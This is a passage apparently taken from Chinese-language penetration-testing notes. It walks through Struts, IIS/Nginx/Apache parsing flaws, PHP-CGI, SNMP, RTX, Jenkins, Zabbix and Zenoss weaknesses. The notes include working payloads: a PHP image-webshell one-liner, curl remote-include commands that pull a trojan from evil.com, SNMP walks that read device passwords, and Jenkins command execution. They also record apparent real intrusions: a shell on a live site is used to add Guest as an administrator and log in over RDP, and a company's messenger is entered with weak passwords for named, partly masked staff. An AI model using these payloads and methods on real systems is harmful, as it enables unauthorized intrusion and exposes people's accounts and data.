src="\assets\img\安全运维\file_html_b9a7ba7d2ab3078c.png" alt=""></p><p><a href="http://xx.xx.xx.xx/fenxiao/" target="_blank" rel="noopener">http://xx.xx.xx.xx/fenxiao/</a> 米某网 </p><p><a href="http://xx.x.xx.xx/fenxiao/api/client/uc.php" target="_blank" rel="noopener">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu<br>（已修改时间，该shell好用）</p><p><code>net user</code></p><p><img src="\assets\img\安全运维\file_html_d3ed608fe971124a.png" alt=""></p><p><code>net user Guest xiuyou!</code></p><p><img src="\assets\img\安全运维\file_html_6ea978c38fc505e6.png" alt=""></p><p><code>net localgroup administrators</code></p><p><img src="\assets\img\安全运维\file_html_eae0acb1c41ca212.png" alt=""></p><p><code>net localgroup administrators Guest /add</code></p><p><img src="\assets\img\安全运维\file_html_60b78b69da695ec6.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_30d1210394b8be38.png" alt=""></p><p>mstsc打开远程终端，<code>Guest / xiuyou!</code></p><p><img src="\assets\img\安全运维\file_html_f8671774fb643b0f.png" alt=""></p><p>激活Guest用户 <code>net user Guest /active:yes</code></p><p><img src="\assets\img\安全运维\file_html_880a526fcaa8650a.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_25d3715c70e27e3d.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_790c103cd138a9e2.png" alt=""></p><h1 id="5-struts漏洞"><a href="#5-struts漏洞" class="headerlink" title="5 struts漏洞 "></a>5 struts漏洞 </h1><p>drops.wooyun.org/papers/902</p><p>sebug.net/appdir/Apache+Struts</p><p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p><h2 id="5-1-S2-016命令执行漏洞"><a href="#5-1-S2-016命令执行漏洞" class="headerlink" title="5.1 S2-016命令执行漏洞 "></a>5.1 S2-016命令执行漏洞 </h2><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts<br>2.3.15.1以下版本均存在此漏洞。</p><h2 id="5-2-S2-017重定向漏洞"><a href="#5-2-S2-017重定向漏洞" class="headerlink" title="5.2 S2-017重定向漏洞 "></a>5.2 S2-017重定向漏洞 </h2><p>Apache Struts<br>2.0.0没有有效过滤”redirect:”/“redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p><h2 id="5-3-S2-019命令执行漏洞"><a href="#5-3-S2-019命令执行漏洞" class="headerlink" title="5.3 S2-019命令执行漏洞"></a>5.3 S2-019命令执行漏洞</h2><p>Struts2 是第二代基于Model-View-Controller<br>(MVC)模型的java企业级web应用框架。Apache<br>Struts 2.3.15.2之前版本的“Dynamic Method<br>Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><h1 id="6-web服务器解析漏洞"><a href="#6-web服务器解析漏洞" class="headerlink" title="6 web服务器解析漏洞 "></a>6 web服务器解析漏洞 </h1><p><a href="http://www.cnseay.com/806/" target="_blank" rel="noopener">www.cnseay.com/806/</a></p><h2 id="6-1-IIS-6-0"><a href="#6-1-IIS-6-0" class="headerlink" title="6.1 IIS 6.0 "></a>6.1 IIS 6.0 </h2><ul><li><p>后缀解析： /xx.asp;.jpg</p></li><li><p>目录解析： /xx.asp/xx.jpg<br>（xx.asp目录下可解析任何文件）</p></li><li><p>默认解析： xx.asa xx.cer xx.cdx<br>（IIS默认配置中，该类文件由asp.dll解析）</p></li><li><p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p></li></ul><h2 id="6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 "></a>6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 </h2><p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p><p>xx.jpg为一句话图片马，制作过程如下：</p><p><code>copy yy.jpg/b + zz.txt/a xx.jpg</code></p><p>/b：二进制模式</p><p>/a：ASCII模式</p><p>yy.jpg ：正常图片文件</p><p>zz.txt ：一句话 &lt;?PHP<br>fputs(fopen(‘shell.php’,’w’),’&lt;?PHP<br>eval(\$_POST\youxiu)?&gt;’);?&gt;</p><p>shell.php youxiu</p><h2 id="6-3-Nginx-lt-0-8-37"><a href="#6-3-Nginx-lt-0-8-37" class="headerlink" title="6.3 Nginx&lt;=0.8.37 "></a>6.3 Nginx&lt;=0.8.37 </h2><p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p><p>在文件路劲(xx.jpg)后面加上%00.php ，即<br>xx.jpg%00.php<br>会被当做php文件来解析</p><p>参照《Nginx空字节可远程执行代码漏洞》</p><h2 id="6-4-Apache"><a href="#6-4-Apache" class="headerlink" title="6.4 Apache "></a>6.4 Apache </h2><ul><li>后缀解析： test.php.x1.x2.x3<br>（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li></ul><p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p><p>Apache可解析： php | php3 | phtml</p><p>参照《Apache漏洞之后缀名解析漏洞》</p><p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p><p>&lt;Files ~ ”.(php.|php3.|phtml.)”&gt;</p><p>Order Allow,Deny</p><p>Deny from all</p><p>&lt;/Files&gt;</p><ul><li>若在Apache中，<br>.htaccess可被应用（即<br>AllowOverride=All）</li></ul><p>.htaccess可被上传</p><p>则在.htaccess中写入<br>(shell.jpg为上传文件，便可得到shell)</p><p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;</p><h2 id="6-5-lighttpd"><a href="#6-5-lighttpd" class="headerlink" title="6.5 lighttpd "></a>6.5 lighttpd </h2><p>xx.jpg/xx.php</p><h2 id="6-6-windows环境"><a href="#6-6-windows环境" class="headerlink" title="6.6 windows环境 "></a>6.6 windows环境 </h2><p>Windows环境下，文件 xx.jpg[空格]</p><p>文件 xx.jpg.</p><p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p><h1 id="7-PHP-CGI远程任意代码执行漏洞"><a href="#7-PHP-CGI远程任意代码执行漏洞" class="headerlink" title="7 PHP-CGI远程任意代码执行漏洞 "></a>7 PHP-CGI远程任意代码执行漏洞 </h1><p>zone.wooyun.org/content/151</p><p><a href="http://www.hackbase.com/tech/2012-05-07/66395.html" target="_blank" rel="noopener">www.hackbase.com/tech/2012-05-07/66395.html</a></p><p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p><p><img src="\assets\img\安全运维\file_html_7505e63d7f39ad25.png" alt=""></p><h2 id="7-1-本地包含执行代码"><a href="#7-1-本地包含执行代码" class="headerlink" title="7.1 本地包含执行代码 "></a>7.1 本地包含执行代码 </h2><p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p><p><a href="http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n" target="_blank" rel="noopener">http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n</a> </p><p>（/proc/self/environ 为本地文件路径）</p><h2 id="7-2-远程包含执行代码"><a href="#7-2-远程包含执行代码" class="headerlink" title="7.2 远程包含执行代码 "></a>7.2 远程包含执行代码 </h2><p>Curl<br><a href="http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt" target="_blank" rel="noopener">http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a> </p><p>（%3d = %3a : %2f / ）</p><p>（<a href="http://www.evail.com/evil.txt为木马文件）" target="_blank" rel="noopener">http://www.evail.com/evil.txt为木马文件）</a></p><h1 id="8-FCK编辑器上传漏洞"><a href="#8-FCK编辑器上传漏洞" class="headerlink" title="8 FCK编辑器上传漏洞 "></a>8 FCK编辑器上传漏洞 </h1><h2 id="8-1-漏洞利用"><a href="#8-1-漏洞利用" class="headerlink" title="8.1 漏洞利用 "></a>8.1 漏洞利用 </h2><ul><li><p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p></li><li><p>编辑器 + web服务器解析漏洞</p></li><li><p>突破后台建立文件夹漏洞（. 变<br>_）</p></li></ul><h1 id="9-Apache-Server-Status对外暴露"><a href="#9-Apache-Server-Status对外暴露" class="headerlink" title="9 Apache Server Status对外暴露 "></a>9 Apache Server Status对外暴露 </h1><p><a href="http://www.ccvita.com/333.html" target="_blank" rel="noopener">www.ccvita.com/333.html</a></p><p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块<br>server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p><h2 id="9-1-利用方式"><a href="#9-1-利用方式" class="headerlink" title="9.1 利用方式 "></a>9.1 利用方式 </h2><p>未做限制访问的URL为：<a href="http://www.apache.org/server-status" target="_blank" rel="noopener">http://www.apache.org/server-status</a></p><h1 id="10-网站备份文件可下载"><a href="#10-网站备份文件可下载" class="headerlink" title="10 网站备份文件可下载 "></a>10 网站备份文件可下载 </h1><p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p><h2 id="10-1-利用方式"><a href="#10-1-利用方式" class="headerlink" title="10.1 利用方式 "></a>10.1 利用方式 </h2><p>常见备份目录为：</p><p><a href="http://www.xxx.com/xxx.rar" target="_blank" rel="noopener">http://www.xxx.com/xxx.rar</a></p><p><a href="http://www.xxx.com/xxx.zip" target="_blank" rel="noopener">http://www.xxx.com/xxx.zip</a></p><p><a href="http://aaa.xxx.com/aaa.rar" target="_blank" rel="noopener">http://aaa.xxx.com/aaa.rar</a></p><p><a href="http://bbb.xxx.com.cn/bbb.tar" target="_blank" rel="noopener">http://bbb.xxx.com.cn/bbb.tar</a></p><p><a href="http://bbb.xxx.com/sysadmin.tar.gz" target="_blank" rel="noopener">http://bbb.xxx.com/sysadmin.tar.gz</a></p><p>ip/<a href="http://www.xxx.com.zip" target="_blank" rel="noopener">www.xxx.com.zip</a></p><ul><li><p>直接在URL中访问，然后下载</p></li><li><p>使用curl工具 例如： curl -I<br><a href="http://www.fff.com/fff.zip" target="_blank" rel="noopener">http://www.fff.com/fff.zip</a></p></li></ul><p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p><h1 id="11-目录遍历并查看敏感数据"><a href="#11-目录遍历并查看敏感数据" class="headerlink" title="11 目录遍历并查看敏感数据 "></a>11 目录遍历并查看敏感数据 </h1><p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p><h2 id="11-1-利用方式"><a href="#11-1-利用方式" class="headerlink" title="11.1 利用方式 "></a>11.1 利用方式 </h2><p>根据从wooyun上看到的漏洞，其发现方式主要有:</p><ul><li><p>wvs扫描目录 (inc，<br>返回312，直接访问看到目录列表)</p></li><li><p>常见泄露路径：</p></li></ul><p><a href="http://www.xxx.com/caches" target="_blank" rel="noopener">http://www.xxx.com/caches</a></p><p><a href="http://www.xxx.com/database" target="_blank" rel="noopener">http://www.xxx.com/database</a></p><p><a href="http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd" target="_blank" rel="noopener">http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</a></p><h1 id="12-SNMP信息泄露"><a href="#12-SNMP信息泄露" class="headerlink" title="12 SNMP信息泄露 "></a>12 SNMP信息泄露 </h1><p>drops.wooyun.org/tips/409</p><h2 id="12-1-基本原理"><a href="#12-1-基本原理" class="headerlink" title="12.1 基本原理 "></a>12.1 基本原理 </h2><p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p><p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p><p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p><p>（community相当于认证口令）</p><p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p><p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p><p>信息，若不一致则不返回任何信息。</p><p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p><p>信息（主要是路由交换设备方面）。</p><h2 id="12-2-snmp弱口令"><a href="#12-2-snmp弱口令" class="headerlink" title="12.2 snmp弱口令 "></a>12.2 snmp弱口令 </h2><p>snmp服务器的默认密码为public，漏洞发现与扫描：</p><ul><li><p>x-scan扫描 + GFI LANGard利用</p></li><li><p>使用Snmp Digger进行漏洞利用</p></li><li><p>snmputil.exe</p></li></ul><p>snmputil.exe get|getnext|walk agent community oid[oid……]</p><p>当前进程列表 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.4.2.1.2</p><p>系统用户列表 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.2.25.1.1</p><p>列 出 域 名 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.4.1.0</p><p>列出安装软件 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.6.3.1.2</p><p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p><ul><li>IP Network<br>Browser（snmp浏览工具）</li></ul><h2 id="12-3-snmp获取管理员密码"><a href="#12-3-snmp获取管理员密码" class="headerlink" title="12.3 snmp获取管理员密码 "></a>12.3 snmp获取管理员密码 </h2><p>snmp默认开放端口: 161</p><ul><li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(<a href="http://www.wooyun.org/bugs/wooyun-2013-021877)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021877)）</a></li></ul><p>扫描工具：<br>solarwinds中的snmpsweep</p><p>升级版：solarwinds工具包中的 ip browser</p><ul><li>华为quidway三层交换</li></ul><p>利用这个OID读出的密码为明文（WooYun-2013-21964(<a href="http://www.wooyun.org/bugs/wooyun-2013-021964)）" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-021964)）</a></p><p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x<br>1.3.6.1.4.1.2011.5.2.1.10.1</p><p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p><p>1.3.6.1.4.1.2011.5.2.1.10.1</p><p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p><p>1.3.6.1.4.1.25506.2.12.1.1.1</p><h2 id="12-4-实战演练"><a href="#12-4-实战演练" class="headerlink" title="12.4 实战演练 "></a>12.4 实战演练 </h2><p><code>snmpwalk -v 2c -c public xx.xx.xx.xx</code></p><p><img src="\assets\img\安全运维\file_html_41e07a3a71e3e362.png" alt=""></p><h1 id="13-SVN源码泄露"><a href="#13-SVN源码泄露" class="headerlink" title="13 SVN源码泄露 "></a>13 SVN源码泄露 </h1><p>drops.wooyun.org/tips/352(<a href="http://drops.wooyun.org/tips/352" target="_blank" rel="noopener">http://drops.wooyun.org/tips/352</a>)</p><h2 id="13-1-SVN介绍"><a href="#13-1-SVN介绍" class="headerlink" title="13.1 SVN介绍 "></a>13.1 SVN介绍 </h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p><p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository<br>Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p><p>svn默认端口是3690</p><h2 id="13-2-漏洞原理"><a href="#13-2-漏洞原理" class="headerlink" title="13.2 漏洞原理 "></a>13.2 漏洞原理 </h2><p>程序导出方式：</p><p>在现实开发环境中，建议使用导出功能svn<br>export（而不是svn co）</p><p>svn co ：【导出结果带 .svn<br>文件夹的目录树】</p><p>svn co http://路径[本地目录全路径]<br>–username 用户名 –password 密码</p><p>svn co svn://路径[本地目录全路径]<br>–username 用户名 –password 密码</p><p>svn export ：【导出结果不带 .svn<br>文件夹的目录树】</p><p>svn export [-r版本号]<br>http://路径[本地目录全路径] –username<br>用户名 –password 密码</p><p>svn export [-r版本号]<br>svn://路径[本地目录全路径] –username<br>用户名 –password 密码</p><p>漏洞产生原因：</p><p>在实际开发环境中，很管理员直接把svn<br>co导出来的代码放到web目录下，致使 .svn<br>隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p><p>漏洞利用方式：</p><p>若 .svn目录没有做访问权限限制，可以通过<br>.svn 来遍历文件和目录列表。</p><p>若<br>*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p><p>若<br>*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p><ul><li><p>直接在浏览器中访问 /.svn/entries</p></li><li><p>利用seay的svn工具</p></li></ul><h1 id="14-hadhoop应用对外访问"><a href="#14-hadhoop应用对外访问" class="headerlink" title="14 hadhoop应用对外访问 "></a>14 hadhoop应用对外访问 </h1><h2 id="14-1-基础概念"><a href="#14-1-基础概念" class="headerlink" title="14.1 基础概念 "></a>14.1 基础概念 </h2><p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p><h2 id="14-2-漏洞利用"><a href="#14-2-漏洞利用" class="headerlink" title="14.2 漏洞利用 "></a>14.2 漏洞利用 </h2><p>默认开放端口：</p><p>hadoop 50070</p><p>hbase 50075</p><p>hdfs 50090</p><ul><li><p>Hadoop管理界面弱口令，例如：admin 123456<br>WooYun-2014-58320(<a href="http://www.wooyun.org/bugs/wooyun-2014-058320" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2014-058320</a>)</p></li><li><p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2<br>RC版本的管理web端能远程执行命令（jstack<br>pstack<br>servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。<br>WooYun-2013-20282(<a href="http://www.wooyun.org/bugs/wooyun-2013-020282" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2013-020282</a>)</p></li></ul><h1 id="15-Nagios信息泄露"><a href="#15-Nagios信息泄露" class="headerlink" title="15 Nagios信息泄露 "></a>15 Nagios信息泄露 </h1><p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p><h2 id="15-1-漏洞利用"><a href="#15-1-漏洞利用" class="headerlink" title="15.1 漏洞利用 "></a>15.1 漏洞利用 </h2><p>Nagios运维监控API接口暴露<br>WooYun-2014-86842(<a href="http://wooyun.org/bugs/wooyun-2014-086842" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2014-086842</a>)</p><h1 id="16-RTX即时通信信息泄露"><a href="#16-RTX即时通信信息泄露" class="headerlink" title="16 RTX即时通信信息泄露 "></a>16 RTX即时通信信息泄露 </h1><p>腾讯通RTX(Real Time<br>eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p><h2 id="16-1-漏洞利用"><a href="#16-1-漏洞利用" class="headerlink" title="16.1 漏洞利用 "></a>16.1 漏洞利用 </h2><p>默认开放端口： 8012</p><ul><li>开放应用端口暴露：<br><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a></li></ul><p>直接可以访问到所有用户id、用户名等信息的json</p><p>在“查看审核结果处”尝试用户名+弱口令(3102<br>或123456)登陆，登陆成功后即进入内部网络。</p><ul><li>得到用户名后，可以读取手机号</li></ul><p>用户名： rtx.bxlq.com/userlist.php</p><p>手机号：<br>rtx.bxlq.com/getmobile.cgi?receiver=用户名</p><h2 id="16-2-动手实践"><a href="#16-2-动手实践" class="headerlink" title="16.2 动手实践 "></a>16.2 动手实践 </h2><p><a href="http://xx.xx.xx.xx:8012/userlist.php" target="_blank" rel="noopener">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p><p><img src="\assets\img\安全运维\file_html_e1c2ee9745806f6d.png" alt=""></p><p>回到首页，查看审核结果处，进行弱口令尝试：高X军<br>/ 123456</p><p><img src="\assets\img\安全运维\file_html_7d72e064c94b344c.png" alt=""></p><p>回到首页，下载并安装客户端进行登陆</p><p><img src="\assets\img\安全运维\file_html_7624c1251b81f7c6.png" alt=""></p><p><img src="\assets\img\安全运维\file_html_da7cf1ecb96eb2d.png" alt=""></p><p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p><p>高X军 123456</p><p>桂X林 123456</p><p>孔X月 123456</p><p><img src="\assets\img\安全运维\file_html_9c42e03c9ee49942.png" alt=""></p><p>公司领导</p><p><img src="\assets\img\安全运维\file_html_4baa431beadedd58.png" alt=""></p><h1 id="17-Ganglia系统监控信息泄露"><a href="#17-Ganglia系统监控信息泄露" class="headerlink" title="17 Ganglia系统监控信息泄露 "></a>17 Ganglia系统监控信息泄露 </h1><p>Ganglia是UC<br>Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p><p>工作原理：</p><p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p><h2 id="17-1-漏洞利用"><a href="#17-1-漏洞利用" class="headerlink" title="17.1 漏洞利用 "></a>17.1 漏洞利用 </h2><p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p><p>开放端口：8649<br>（不确定，案例中还有开放8000）</p><ul><li><p>直接在浏览器地址栏输入IP:8649 eg:<br><a href="http://xx.xx.xxx.xx:8649/" target="_blank" rel="noopener">http://xx.xx.xxx.xx:8649/</a></p></li><li><p>直接访问域名：ganglia.xx.com</p></li><li><p>使用nc查看： nc.exe iii.com<br>8649 |more</p></li></ul><h1 id="18-j2ee应用架构（web服务器搭配不当）"><a href="#18-j2ee应用架构（web服务器搭配不当）" class="headerlink" title="18 j2ee应用架构（web服务器搭配不当） "></a>18 j2ee应用架构（web服务器搭配不当） </h1><p>drops.wooyun.org/papers/60</p><p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p><p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p><p>Tomcat：免费开放源代码的j2ee<br>Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p><h2 id="18-1-漏洞成因"><a href="#18-1-漏洞成因" class="headerlink" title="18.1 漏洞成因 "></a>18.1 漏洞成因 </h2><p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p><p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p><p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p><p>lib目录：所有框架、插件和组件的架包；</p><p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p><p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p><p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp<br>、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p><h2 id="18-2-漏洞利用"><a href="#18-2-漏洞利用" class="headerlink" title="18.2 漏洞利用 "></a>18.2 漏洞利用 </h2><p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p><h2 id="18-3-修复方案"><a href="#18-3-修复方案" class="headerlink" title="18.3 修复方案 "></a>18.3 修复方案 </h2><ul><li><p>最好不要映射非静态文件目录或敏感目录；</p></li><li><p>修改nginx配置文件，禁止访问WEB-INF文件<br>:<code>Location ~ ^/WEB-INF/* {deny all;}</code></p></li></ul><h1 id="19-Jenkins平台未设置登录验证"><a href="#19-Jenkins平台未设置登录验证" class="headerlink" title="19 Jenkins平台未设置登录验证 "></a>19 Jenkins平台未设置登录验证 </h1><p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p><h2 id="19-1-漏洞利用"><a href="#19-1-漏洞利用" class="headerlink" title="19.1 漏洞利用 "></a>19.1 漏洞利用 </h2><ul><li>未授权访问，可直接执行命令 wooyun-2013-028803</li></ul><p>直接在url中访问： eg:<br><a href="http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)" target="_blank" rel="noopener">http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)</a><br>(端口视具体情况而定，案例中有3000、8888)</p><ul><li><a href="http://ip/script" target="_blank" rel="noopener">http://ip/script</a></li></ul><p>java.lang.Runtime.getRuntime().exec(‘id’).getText();<br>行脚本并回显一句话</p><h1 id="20-zabbix默认口令"><a href="#20-zabbix默认口令" class="headerlink" title="20 zabbix默认口令 "></a>20 zabbix默认口令 </h1><h2 id="20-1-基础知识"><a href="#20-1-基础知识" class="headerlink" title="20.1 基础知识 "></a>20.1 基础知识 </h2><p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p><p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p><h2 id="20-2-利用方式"><a href="#20-2-利用方式" class="headerlink" title="20.2 利用方式 "></a>20.2 利用方式 </h2><p>弱口令进入后台： <a href="http://ip/zabbix/" target="_blank" rel="noopener">http://ip/zabbix/</a> admin / zabbix</p><p>攻击方法：</p><ul><li><p>尝试system.run执行命令</p></li><li><p>获取zabbix server shell：</p></li></ul><p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为<br>uname -a)</p><p>Monitoring——&gt;Last data——&gt;点击Zabbix<br>server，执行调用命令</p><h1 id="21-zenoss默认口令"><a href="#21-zenoss默认口令" class="headerlink" title="21 zenoss默认口令 "></a>21 zenoss默认口令 </h1><h2 id="21-1-基本知识"><a href="#21-1-基本知识" class="headerlink" title="21.1 基本知识 "></a>21.1 基本知识 </h2><p>Zenoss<br>Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p><h2 id="21-2-漏洞利用"><a href="#21-2-漏洞利用" class="headerlink" title="21.2 漏洞利用 "></a>21.2 漏洞利用 </h2><p>ip:8080 admin / zenoss</p><p>ip:8080/zport/dmd/Dashboard</p><p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p><p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p><ul><li><p>wooyun-2013-019917 反弹获取shell</p></li><li><p>wooyun-2013-019917<br>边界神器py版开启socks代理</p></li></ul><p>（zone.wooyun.org/content/1693）</p><ul><li>wooyun-2013-019917<br>端口转发（将代理端口转发到公网）</li></ul><h1 id="22-Resin任意文件读取"><a href="#22-Resin任意文件读取" class="headerlink" title="22 Resin任意文件读取 "></a>22 Resin任意文件读取 </h1><h2 id="22-1-基本知识"><a href="#22-1-基本知识" class="headerlink" title="22.1 基本知识 "></a>22.1 基本知识 </h2><p>Resin：java应用服务器</p><p>CAUCHO公司产品，是一个非常流行的application server<br>，对server和JSP提供良好的支持，速度非常快直逼APACHE<br>SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p><h2 id="22-2-漏洞利用"><a href="#22-2-漏洞利用" class="headerlink" title="22.2 